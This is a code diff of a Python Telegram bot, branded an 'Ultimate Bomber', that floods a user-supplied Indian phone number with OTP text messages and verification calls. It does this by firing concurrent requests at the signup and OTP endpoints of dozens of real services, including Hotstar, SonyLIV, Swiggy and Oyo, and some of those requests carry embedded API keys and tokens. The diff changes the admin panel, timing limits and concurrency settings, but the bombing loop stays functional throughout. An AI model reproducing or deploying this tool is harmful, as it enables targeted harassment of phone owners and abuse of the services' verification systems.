@@ -8,7 +8,6 @@ import uuid
 import hmac
 import hashlib
 import base64
-import json
 from typing import Optional
 
 import aiohttp
@@ -26,14 +25,9 @@ BOT_TOKEN   = os.environ.get("BOT_TOKEN", "")
 WEBHOOK_URL = os.environ.get("RENDER_EXTERNAL_URL", "").rstrip("/")
 PORT        = int(os.environ.get("PORT", 8000))
 
-# ?? APNI TELEGRAM ID YAHAN DAALEIN
-ADMIN_ID = 8959878185  
-
-# SPEED CONFIG
-CONCURRENCY     = 400              
-DELAY           = 0.0              
-REQUEST_TIMEOUT = 3                
-MAX_DURATION    = 24 * 60 * 60     # 24 hours hard limit
+CONCURRENCY     = 100
+DELAY           = 0.5
+REQUEST_TIMEOUT = 5
 # ============================================
 
 logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
@@ -49,14 +43,14 @@ def is_valid_target(num: str) -> bool:
 
 
 # =========================================================================
-#  ULTIMATE APIS (Old + New Merged)
+#  ULTIMATE APIS (All Old + All New)
 # =========================================================================
 def build_endpoints():
     UA_D = "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36"
     UA_C2 = "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36"
     E = []
 
-    # ---------- 1. NEW APIS (From Hotstar, SonyLIV, Paytm, etc.) ----------
+    # ---------- 1. NAYE APIS (Hotstar, SonyLIV, Paytm, etc.) ----------
     E.append({"name":"Hotstar","method":"PUT","url":"https://api.hotstar.com/um/v3/users/037a0fe368304ec798c3a1480936a112/register?register-by=phone_otp","headers":{"Host":"api.hotstar.com","content-type":"application/json","x-hs-platform":"PCTV","origin":"https://www.hotstar.com","User-Agent":UA_C2},"data":'{"phone_number":"{t}","country_prefix":"91"}'})
     E.append({"name":"AltBalaji","method":"POST","url":"https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN","headers":{"Accept":"application/json","X-API-KEY":"MTYwMTA0MzI4OTEyN30.oNzgLsMqF8n9jroKUG9F3cXR90Wm1OyJLvVuG-XaklE","Content-Type":"application/json","Origin":"https://www.altbalaji.com","User-Agent":UA_C2},"data":'{"phone_number":"{t}","country_code":"91","platform":"web","exp":1601043289127}'})
     E.append({"name":"SonyLIV","method":"POST","url":"https://apiv2.sonyliv.com/AGL/1.6/A/ENG/WEB/IN/CREATEOTP","headers":{"Accept":"application/json","x-via-device":"true","origin":"https://www.sonyliv.com","User-Agent":UA_C2},"data":'{"channelPartnerID":"MSMIND","mobileNumber":"{t}","country":"IN","timestamp":"2020-09-24T14:03:03.505Z"}'})
@@ -80,7 +74,7 @@ def build_endpoints():
     E.append({"name":"Oyo","method":"POST","url":"https://www.oyorooms.com/api/pwa/generateotp?locale=en","headers":{"xsrf-token":"vsnr5ksR-bduQ9oz3foaxbqjfoLSnVIzFzY0","Content-Type":"text/plain;charset=UTF-8","Origin":"https://www.oyorooms.com","User-Agent":UA_C2},"data":'{"phone":"{t}","country_code":"+91","nod":4}'})
     E.append({"name":"BurgerKing","method":"POST","url":"https://consumer-apis.burgerking.in/api/v1/user/signUp","headers":{"appversion":"1.6","content-type":"application/json","platform":"web","Origin":"https://www.burgerking.in","User-Agent":UA_C2},"data":'{"phone_no":"{t}"}'})
 
-    # ---------- 2. OLD APIS ----------
+    # ---------- 2. PURANE APIS (Bombitup + Diljot + Tsunami) ----------
     E.append({"name":"Swiggy_Call","method":"POST","url":"https://profile.swiggy.com/api/v3/app/request_call_verification","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://www.swiggy.com"},"data":'{"mobile":"{t}"}'})
     E.append({"name":"TataCapital_Voice","method":"POST","url":"https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}","isOtpViaCallAtLogin":"true"}'})
     E.append({"name":"1MG_Call","method":"POST","url":"https://www.1mg.com/auth_api/v6/create_token","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"number":"{t}","otp_on_call":true}'})
@@ -191,6 +185,7 @@ def build_endpoints():
 
     return E
 
+
 ENDPOINTS = build_endpoints()
 
 
@@ -198,7 +193,7 @@ ENDPOINTS = build_endpoints()
 async def get_http_session() -> aiohttp.ClientSession:
     global _http_session
     if _http_session is None or _http_session.closed:
-        connector = aiohttp.TCPConnector(limit=500, limit_per_host=100, ssl=False)
+        connector = aiohttp.TCPConnector(limit=200, limit_per_host=50, ssl=False)
         timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
         _http_session = aiohttp.ClientSession(connector=connector, timeout=timeout)
     return _http_session
@@ -248,37 +243,11 @@ async def _fire_batch(batch, target):
     return sum(1 for r in results if r is True)
 
 
-# ================== ADMIN PANEL ==================
-async def admin_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    uid = update.effective_user.id
-    if uid != ADMIN_ID:
-        return await update.message.reply_text("? You are not authorized.")
-    
-    keyboard = [
-        [InlineKeyboardButton("SEND SMS", callback_data="admin_sms"), InlineKeyboardButton("MANAGE FIREBASE", callback_data="admin_firebase")],
-        [InlineKeyboardButton("MANAGE VIDEOS", callback_data="admin_videos"), InlineKeyboardButton("MANAGE SUPER ADMINS", callback_data="admin_superadmins")],
-        [InlineKeyboardButton("MANAGE ADMINS", callback_data="admin_admins"), InlineKeyboardButton("VIEW USERS", callback_data="admin_users")],
-        [InlineKeyboardButton("BAN USER", callback_data="admin_ban"), InlineKeyboardButton("UNBAN USER", callback_data="admin_unban")],
-        [InlineKeyboardButton("BROADCAST", callback_data="admin_broadcast"), InlineKeyboardButton("API STATS", callback_data="admin_stats")],
-        [InlineKeyboardButton("ACTIVITI LOG", callback_data="admin_log"), InlineKeyboardButton("PRICING PLANS", callback_data="admin_pricing")],
-        [InlineKeyboardButton("REDEEM CODES", callback_data="admin_redeem"), InlineKeyboardButton("ADD CREDITS", callback_data="admin_addcredits")],
-        [InlineKeyboardButton("DEDUCT CREDITS", callback_data="admin_deductcredits"), InlineKeyboardButton("ADD CREDITS ALL", callback_data="admin_addall")],
-        [InlineKeyboardButton("DEDUCT ALL", callback_data="admin_deductall"), InlineKeyboardButton("FORCE JOIN", callback_data="admin_forcejoin")],
-        [InlineKeyboardButton("SETTINGS", callback_data="admin_settings"), InlineKeyboardButton("SMS HISTORY", callback_data="admin_history")],
-        [InlineKeyboardButton("EXPORT SCRIPT", callback_data="admin_export"), InlineKeyboardButton("PROTECT NUMBER", callback_data="admin_protect")],
-        [InlineKeyboardButton("PROTECTED LIST", callback_data="admin_protectedlist"), InlineKeyboardButton("TRACK NUMBER", callback_data="admin_track")],
-        [InlineKeyboardButton("?? DISABLE FREE MODE", callback_data="admin_freemode")],
-        [InlineKeyboardButton("REFRESH", callback_data="admin_refresh")]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    await update.message.reply_text("?? **ADMIN CONTROL PANEL** ??", reply_markup=reply_markup, parse_mode="Markdown")
-
-
 # ================== HANDLERS ==================
 async def start_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     keyboard = [[InlineKeyboardButton("?? START ULTIMATE BOMBER ??", callback_data="start_bomb")]]
     reply_markup = InlineKeyboardMarkup(keyboard)
-    text = "?? **ULTIMATE 24H BOMBER** ??\n\nAll APIs loaded. Click below to begin."
+    text = "?? **ULTIMATE BOMBER** ??\n\nAll APIs loaded. Click below to begin."
     await update.message.reply_text(text, reply_markup=reply_markup, parse_mode="Markdown")
 
 
@@ -297,20 +266,6 @@ async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             s["running"] = False
             s["cancelled"] = True
             await query.message.edit_text("?? **STOPPING...**", parse_mode="Markdown")
-            
-    elif query.data.startswith("admin_"):
-        if uid != ADMIN_ID:
-            return await query.answer("? Unauthorized Access!", show_alert=True)
-            
-        action = query.data.replace("admin_", "")
-        if action == "refresh":
-            await query.answer("? Panel Refreshed!", show_alert=True)
-        elif action == "stats":
-            await query.answer(f"?? Total APIs: {len(ENDPOINTS)}\n?? Users: {len(user_sessions)}", show_alert=True)
-        elif action == "users":
-            await query.answer(f"?? Total Users: {len(user_sessions)}", show_alert=True)
-        else:
-            await query.answer(f"?? '{action.upper()}' feature requires Database.", show_alert=True)
 
 
 async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
@@ -325,7 +280,7 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("? Invalid. 10 digits starting with 6/7/8/9.")
         return
 
-    s.update(target=text, state="running", running=True, cancelled=False, timeout=False, sent=0, round=0, started_at=time.time())
+    s.update(target=text, state="running", running=True, cancelled=False, sent=0, round=0, started_at=time.time())
 
     keyboard = [[InlineKeyboardButton("?? STOP BOMBING", callback_data="stop_bomb")]]
     reply_markup = InlineKeyboardMarkup(keyboard)
@@ -343,21 +298,14 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     asyncio.create_task(run_bombing(uid, s))
 
 
-# ================== BOMBING LOGIC (24H UNLIMITED) ==================
 async def run_bombing(uid: int, s: dict):
     target = s["target"]
     sent = 0
     start = time.time()
     idx = 0
-    last_report = start
 
     try:
         while s.get("running"):
-            # 24-Hour limit check
-            if time.time() - start >= MAX_DURATION:
-                s["timeout"] = True
-                break
-
             s["round"] += 1
             batch = []
             for _ in range(CONCURRENCY):
@@ -368,27 +316,8 @@ async def run_bombing(uid: int, s: dict):
             sent += ok
             s["sent"] = sent
 
-            # Live Progress every 15 seconds
-            now = time.time()
-            if now - last_report >= 15:
-                last_report = now
-                try:
-                    await telegram_app.bot.send_message(
-                        uid,
-                        f"?? **Live Update**\n"
-                        f"?? Target: `{target}`\n"
-                        f"?? Sent: *{sent}*\n"
-                        f"? Speed: *{int(sent/(now-start))} SMS/sec*\n"
-                        f"? Time: {int(now-start)//60}m {int(now-start)%60}s / 24h",
-                        parse_mode="Markdown"
-                    )
-                except Exception:
-                    pass
-
             if DELAY > 0:
                 await asyncio.sleep(DELAY)
-            else:
-                await asyncio.sleep(0.01)
 
     except Exception as e:
         logger.exception(f"Bombing error: {e}")
@@ -396,25 +325,10 @@ async def run_bombing(uid: int, s: dict):
         s["running"] = False
 
     try:
+        bot = Bot(token=BOT_TOKEN)
         elapsed = int(time.time() - start)
-        speed = int(sent / elapsed) if elapsed > 0 else 0
-        
-        if s.get("cancelled"):
-            reason = "?? **Stopped by you**"
-        elif s.get("timeout"):
-            reason = "? **24-Hour limit reached**"
-        else:
-            reason = "? **Finished**"
-            
-        await telegram_app.bot.send_message(
-            uid, 
-            f"{reason}!\n\n"
-            f"?? Target: `{target}`\n"
-            f"?? Total Sent: *{sent}*\n"
-            f"? Speed: *{speed} SMS/sec*\n"
-            f"? Time: {elapsed//3600}h {(elapsed%3600)//60}m {elapsed%60}s",
-            parse_mode="Markdown"
-        )
+        reason = "?? Stopped by you" if s.get("cancelled") else "? Done"
+        await bot.send_message(uid, f"{reason}!\n\n?? Target: `{target}`\n?? Total: *{sent}*\n? Time: {elapsed}s", parse_mode="Markdown")
     except Exception:
         pass
 
@@ -425,21 +339,19 @@ async def health(request):
 
 
 async def root(request):
-    return PlainTextResponse("Ultimate 24H Bomber Live ??")
+    return PlainTextResponse("Ultimate Bomber Live ??")
 
 
 async def startup():
     global telegram_app
     if not WEBHOOK_URL:
-        logger.warning("RENDER_EXTERNAL_URL not set")
+        logger.warning("RENDER_EXTERNAL_URL not set — webhook will NOT be registered")
         return
     webhook_path = f"/webhook/{BOT_TOKEN}"
     full_url = f"{WEBHOOK_URL}{webhook_path}"
 
     telegram_app = Application.builder().token(BOT_TOKEN).updater(None).build()
-    
     telegram_app.add_handler(CommandHandler("start", start_cmd))
-    telegram_app.add_handler(CommandHandler("admin", admin_cmd))
     telegram_app.add_handler(CallbackQueryHandler(button_handler))
     telegram_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))
 
